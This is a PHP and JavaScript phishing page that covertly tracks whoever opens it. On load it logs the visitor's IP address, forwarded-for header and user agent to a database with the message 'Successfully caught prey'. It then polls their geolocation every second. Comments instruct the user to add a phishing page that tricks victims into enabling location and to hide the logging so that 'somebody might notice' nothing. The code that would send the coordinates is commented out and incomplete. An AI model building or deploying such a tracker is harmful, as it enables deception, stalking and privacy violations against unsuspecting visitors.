<?php
	// As soon as someone opens the page, open a session, then add them to the 'devices' table
	require '../auth/database.php';
	require 'token.php'; // Has a function for generating tokens
	if (!isset($_SESSION['token'])) { // If the user doesn't already have a session, give them one and add them to the database
		// Create session variable
		$_SESSION['token'] = random_str(45); // Length of 45 chars, default alphanumeric keyspace

		$sql = "INSERT INTO devices (token, user_agent, ip_remote_addr, ip_forwarded_for, time_located) VALUES (:token, :user_agent, :ip_remote_addr, :ip_forwarded_for, :time_located);";
		$stmt = $conn->prepare($sql); // We get $conn from auth/database.php

		// Always bind parameters, SQL injection is so 2003
		$stmt->bindParam(":token", $_SESSION['token']); // The token we gave the user
		$stmt->bindParam(":user_agent", $_SERVER['HTTP_USER_AGENT']); // UserAgent header string
		$stmt->bindParam(":ip_remote_addr", $_SERVER['REMOTE_ADDR']); // The address the connection was made from
		$stmt->bindParam(":ip_forwarded_for", $_SERVER['HTTP_X_FORWARDED_FOR']); // An HTTP header sometimes set by proxy servers -- if set do not implicitly trust
		$time =  date("Y-m-d H:i:s"); // We need to pass a variable to bindParam for futureproofing reasons
		$stmt->bindParam(":time_located", $time); // Date formatted for MySQL's DATE type
		
		// Run the statement
		if ($stmt->execute()) {
			$color = "green";
			$message = "Successfully caught prey";
		} else {
			$color = "red";
			$message = "Nope";
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
<!-- The basis for this JS is the part I heartlessly stole from DemmSec - props to those guys for being fantastic -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script> <!-- jQuery -->
<script type="text/javascript">
var token = "<?php echo $_SESSION['token'] ?>"; // We need this on the client side so we can send it with the request in order to identify ourselves
function httpGet(url) { // This should be done as POST to follow proper HTTP etiquette
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", url, false); // False means synchronous
	xmlHttp.send(null);
	return xmlHttp.responseText;

	// Rewrite in jQuery.get()?
	//$.get(url, function(data){
	//	
	//});
}

function autoUpdate() {
	navigator.geolocation.getCurrentPosition(function(position) {
		coords = position.coords.latitude + "," + position.coords.longitude;
		url = "/logme/logme.php?";
		//httpGet(url);
		console.log("Works! Coords: " + coords); // Keep this commented out in production, somebody might notice
		setTimeout(autoUpdate, 1000);
	});
}

$(document).ready(function() {
		autoUpdate();
		console.log(token);
});
</script>
</head>
<body>
	<!-- Add your phishing page here to try and convince the user to allow location -->
	<h1>Turn on location services</h1>
	<h2 style="color: <?php echo $color ?>"><?php echo $message ?></h2>
</body>
</html>
